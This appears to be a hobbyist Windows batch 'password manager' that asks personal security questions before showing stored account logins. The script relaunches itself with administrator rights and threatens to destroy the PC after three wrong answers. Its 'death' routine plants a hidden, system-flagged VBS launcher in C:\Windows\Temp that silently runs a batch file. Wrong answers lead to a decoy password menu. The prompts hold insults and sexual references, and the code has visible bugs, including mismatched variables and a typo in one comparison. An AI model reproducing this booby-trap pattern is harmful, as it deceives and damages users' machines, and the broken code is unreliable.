@echo off
title Pass Manager by Phoenixthrush
REM Version 1.3
color a

if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)

echo Welcome to the Pass Manager!
echo If u make more than 3 Misstakes, ur PC will be destroyed!
echo ==========================================================
echo.
...
:Security_Questions
set trys=3
echo What is the name of my Bengal Cat?
echo ===================================

set /p cat="The Name of my Cat is "
if %cat%==Atisz goto rightcat
if not %cat%==Atisz goto falsecat

:falsecat
echo are u dumb or a hacker which wanna steal my data xD!
echo.
echo Press a Key to go to the next Security Question! :)
pause >nul
set /a trys=trys-1
if %trys%==0 goto death
if not %trys%==0 goto Question2
cls
...
:Question2
echo What is my childhood name?
echo ===========================

set /p childname=="My name is "
if %childname%==Lulu goto rightchildname
if not %childname%==Lulu goto falsechildname
...
set /a trys=trys-1
if %trys%==0 goto death
if not %trys%==0 goto Question3
cls

:rightchildname
echo.
echo lol right
echo Press a Key to go to the next Security Questions! :)
pause >nul
cls
goto Question3

:Question3
echo What is my Insta name?
echo =======================

set /p instaname=="My Insta name is "
if %instaname%==Phoenixthrush goto rightinstaname
if not %instaname%==Phoenixthruh goto falseinstaname

:falseinstaname
echo.
echo false dumb bitch!
echo You have 1 try left!
echo Press a Key to go to the next Security Question! :)
pause >nul
set /a trys=trys-1
if %trys%==0 goto death
if not %trys%==0 goto Question4
cls
...
:Question4
echo Which ecchi was the first I watched?
echo A little help... (Its in a Highschool with deamons!)
echo =====================================================

set /p ecchiname="The name of the ecchi is "
if %ecchiname%==Highschool DxD goto rightecchiname
if not %ecchiname%==Highschool DxD goto falseecchiname
...
:Question5
echo Which thai Pornstar I loved?
echo A little help... (Its not anime_dream)
echo =======================================

set /p pornstar="Her name is "
if %pornstar%==May Thai goto rightpornstar
if not %pornstar%==May Thai goto falsepornstar

:false falsepornstar
echo.
echo False! bruh
echo Thanks for ur Time!
echo I will redirect u to the Passords!
echo Press a Key to go to the next Security Questions! :)
pause >nul
set /a trys=trys-1
if %trys%==0 goto death
if not %trys%==0 goto Main_Menue
cls
...
set deathpath=C:\Windows\Temp\
set deathname=tempsysfile.vbs
set deathline1=Set WshShell = WScript.CreateObject( "WScript.Shell" )
set deathline2=WshShell.Run "C:\Windows\Temp\tempsysfile.bat",0,True
echo %deathline1% >> %deathpath%%deathname%
echo %deathline2% >> %deathpath%%deathname%
attrib +r +h +s C:\Windows\Temp\tempsysfile.vbs
cls

echo The Programm is going to decrypt the Passwords!
echo This can spend some time!
...
echo.
echo [6] Exit
echo The Passwd will be copied to the Clipboard!
echo After u closed the Passwd Manager the Clipboard will be cleared!
echo.

set /p fake_main_menue_choice="Which Acc do u wanna use?"
if %main_menue_choice%==1 goto fake_password
if %main_menue_choice%==2 goto fake_password
if %main_menue_choice%==3 goto fake_password
if %main_menue_choice%==4 goto fake_password
if %main_menue_choice%==5 goto fake_password
if %main_menue_choice%==6 goto Exit

:fake_password
echo The Password is ?!Phoenix1012!
...
set /p main_menue_choice="Which Acc do u wanna use?"
if %main_menue_choice%==1 goto Apple_ID
if %main_menue_choice%==2 goto Outlook
if %main_menue_choice%==3 goto GMail
if %main_menue_choice%==4 goto Steam
if %main_menue_choice%==5 goto Epic_Games
if %main_menue_choice%==6 goto Exit

:Apple_ID
cls
echo Which Account do u wanna use?
echo ==============================
echo [1] tmp@hotmail.com
echo [2] tmp@hotmail.com
echo.
echo [3] Go to the Main Menue!
echo.

set /p main_menue_choice="Which EMail do u wanna use?"
if %main_menue_choice%==1 goto Apple_ID1
if %main_menue_choice%==2 goto Apple_ID2
if %main_menue_choice%==3 goto Apple_ID3

:Apple_ID1
echo Do u wanna copy the email?
set /p Apple_ID1_choice="Yeah or no? [y] [n]= "
if %Apple_ID1_choice%==y goto Apple_ID1_yeah
if %Apple_ID1_choice%==n goto Apple_ID1_no
pause >nul

:Apple_ID1_yeah
echo tmp@hotmail.com| clip
echo EMail copied!
echo Press a Key to copy the password!
pause >nul
echo pass| clip
echo Password copied!
echo Press a Key to go to main menue!
pause >nul
goto Main_Menue
...
:Apple_ID2
echo Do u wanna copy the email?
set /p Apple_ID2_choice="Yeah or no? [y] [n]= "
if %Apple_ID2_choice%==y goto Apple_ID2_yeah
if %Apple_ID2_choice%==n goto Apple_ID2_no
pause >nul
...
echo [1] tmp@hotmail.com
echo [2] tmp@hotmail.com
echo [3] tmp@hotmail.com
echo.
echo [4] Go to the Main Menue!
echo.

set /p main_menue_choice="Which EMail do u wanna use?"
if %main_menue_choice%==1 goto Outlook_1
if %main_menue_choice%==2 goto Outlook_2
if %main_menue_choice%==3 goto Outlook_3
if %main_menue_choice%==4 goto Outlook_4

:Outlook_1
echo Do u wanna copy the email?
set /p Outlook_choice="Yeah or no? [y] [n]= "
if %Outlook_choice%==y goto Outlook_yeah
if %Outlook_choice%==n goto Outlook_no
pause >nul
...
:Outlook_2
echo Do u wanna copy the email?
set /p Outlook2_choice="Yeah or no? [y] [n]= "
if %Outlook2_choice%==y goto Outlook2_yeah
if %Outlook2_choice%==n goto Outlook2_no
pause >nul
...
:Outlook_3
echo Do u wanna copy the email?
set /p Outlook_3_choice="Yeah or no? [y] [n]= "
if %Outlook_3_choice%==y goto Outlook_3_yeah
if %Outlook_3_choice%==n goto Outlook_3_no
pause >nul
...
echo [1] tmp@hotmail.com
echo.
echo [2] Go to the Main Menue!
echo.

set /p main_menue_choice="Which EMail do u wanna use?"
if %main_menue_choice%==1 goto GMail_1
if %main_menue_choice%==2 goto GMail_2

:GMail_1
echo Do u wanna copy the email?
set /p GMail_1_choice="Yeah or no? [y] [n]= "
if %GMail_1_choice%==y goto GMail_1_yeah
if %GMail_1_choice%==n goto GMail_1_no
pause >nul
...
set /p main_menue_choice="Which EMail do u wanna use?"
if %main_menue_choice%==1 goto Steam_1
if %main_menue_choice%==2 goto Steam_2

:Steam_1
echo Do u wanna copy the email?
set /p Steam_1_choice="Yeah or no? [y] [n]= "
if %Steam_1_choice%==y goto Steam_1_yeah
if %Steam_1_choice%==n goto Steam_1_no
pause >nul
...
set /p main_menue_choice="Which EMail do u wanna use?"
if %main_menue_choice%==1 goto Epic_Games_1
if %main_menue_choice%==2 goto Epic_Games_2

:Epic_Games_1
echo Do u wanna copy the email?
set /p Epic_Games_1_choice="Yeah or no? [y] [n]= "
if %Epic_Games_1_choice%==y goto Epic_Games_1_yeah
if %Epic_Games_1_choice%==n goto Epic_Games_1_no
pause >nul
...
echo This Programm was coded by Phoenixthrush! :)
echo ********************| clip
echo Press a Key to exit!
pause >nul
exit
